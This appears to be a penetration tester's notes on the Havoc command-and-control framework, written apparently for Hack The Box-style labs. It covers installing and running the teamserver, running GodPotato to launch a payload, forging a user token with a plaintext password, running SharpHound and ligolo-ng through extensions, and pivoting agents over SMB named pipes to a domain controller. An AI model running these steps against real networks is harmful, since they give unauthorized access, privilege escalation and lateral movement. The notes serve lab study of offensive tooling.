Havoc is a modern and malleable post-exploitation command and control framework.
![[Pasted image 20240815100327.png]]
Reference: [GitHub - HavocFramework/Havoc: The Havoc Framework.](https://github.com/HavocFramework/Havoc)

## What can be used for?
As the description implies, it is used as "post-exploitation" toolkit to easily keep all the connection to the victim hosts up and running(even post reboot), which gives you sort of "persistence".
None the less the tool includes a plethora of modules that can be useful like file explorer with file upload/download feature, pivoting, PowerShell command line to victim, mimikatz, load dll shellcode straight into memory and many more.

## How to install?
Follow the wiki from the developer from this site: [1. Installation.md | Havoc Documentation (havocframework.com)](https://havocframework.com/docs/installation)
At the end you will have 2 working folders, one for the server(the workhorse basically) and one for the front-end client with gives you a nice web gui that let's you easily work together with your colleagues.

```
//Install required packages: 
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm

//Clone repository: 
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

//Install teamserver & client
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
cd ..
make ts-build
make client-build
```

## Profiles
Profiles are used both by server and client binary to load specifical configurations during startup process which allows you virtually to configure the environment as you like.
All the configuration files are saved in Yaml description files, for more information see here: 
[5. Listeners.md | Havoc Documentation (havocframework.com)](https://havocframework.com/docs/listeners)

- **Server config:** allows you to choose which PORT/IP where the server is running at, Users that are allowed to login etc. Edit the yaml config file at **./profiles/havoc.yaotl** to add/remove the users that are allow to login, and eventual listening port for the team server.
- **Client config:** holds the config needed to login back to the team server.

## How to run it ?
Start the team server
```
./havoc server --profile ./profiles/havoc.yaotl -v --debug
```

Run the client to get the webgui
```
./havoc client
```

## Sideload executables
If you want to elevate you shell(ex. by leveraging over Impersonation) permission you can upload a Havoc beacon to the victim and get a normal shell as you initial user. 
```shell-session
07/10/2024 14:18:39 [user] Demon Â» dotnet execute-inline /home/user/Downloads/GodPotato-NET4.exe -cmd "C:\web\culo.exe"
```
This will sideload the binary directly from your machine without the need to upload the shell again.

## Impersonate users
It is possible to craft new tokes and impersonate other users(see it as a TGT). If you want to inject a token for another user in your current session you will do something like this.
```shell-session
token make child.htb.local svc_sql jkhnrjk123!
```
Then you should be able to list the tokens.
```
token list

  ID   Handle  Domain\User              PID   Type           Impersonating
 ----  ------  -----------              ---   -------------- -------------
 0     0x280   child.htb.local\svc_sql  1284  make (local)   Yes 
```
And with this now you can use it to reach other services on behalf of another user!

## Sharphound via HAVOC
It is possible to talk directly to Bloodhound CE([SpecterOps/BloodHound: Six Degrees of Domain Admin (github.com)](https://github.com/SpecterOps/BloodHound)) from a established session.
- Setup the Bloodhound CE on your machine.
- Install the **Havoc Bloodhound** extension in Havoc from *Attack --> Extenstions*
- Configure the extentsion by linking the Sharphound.exe that will be sideloaded, and the API key to the Bloodhound CE by following the official guide. [p4p1/havoc-bloodhound: A GUI wrapper inside of Havoc to interact with bloodhound CE (github.com)](https://github.com/p4p1/havoc-bloodhound?tab=readme-ov-file)
- When done just run a scan to collect, and upload the results to the backend.

## Ligolo via HAVOC
It is also possible to perform pivoting task via Ligolo-ng directly from Havoc by using the native tool: [p4p1/havoc-ligolo: A Havoc UI tool to pivot onto a machine using ligolo-ng (github.com)](https://github.com/p4p1/havoc-ligolo) . 
- Install the extension named **havoc-ligolo** in HAVOC *Attack-->Extension*
- Configure the listening  address/port and the subnet to route on the ligolo interface from the Ligolo Settings in Havoc(check repo for how in detail).
- It will require root permission in order to create the nic and set the routing table.
- When done, spin up the proxy on your machine as you would normally do... (you can use the proxy at **/home/user/Downloads/Havoc/data/extensions/havoc-ligolo/ligolo-ng**)
- From an estabilished session use the command `ligolo-ng` to make a callback to your server.

## Reverse shells
There might be times when there is a segmentation in place that forbids you to reach some point in the network even if being on the same subnet, in this case you can use SMB named pipes to cover this issues. Specifically imagine having this flow (**KALI --> WEB01 --> DC01**), in this case.
- The agent will be able to talk back to us from WEB01.
- DC01 won't be able as it can only reach WEB01 and then us.<font color="#c00000"> In Metasploit you would use a reverse https shell for this, and point the payload to the Ip of the pivot(internal one).</font>
Specifically you will create 2 listeners.
- One HTTPS/HTTP for the **pivoting machine**(aka the initial one that can talk back to you!)
- A SMB type named listener(you can choose whatever named pipe your like!). This one will be used on the machine you want to reach via the Pivot one.
Now you upload and invoke the agents.
- On the **pivot** run the http agent.
- On the **secondary**(reachable only via pivot) you will run the samba agent.
- From the pivot session run this to get back a shell via the pivot to your HAVOC backend.
```havoc-shell
pivot connect SECONDARYHOSTNAME PIPENAME
```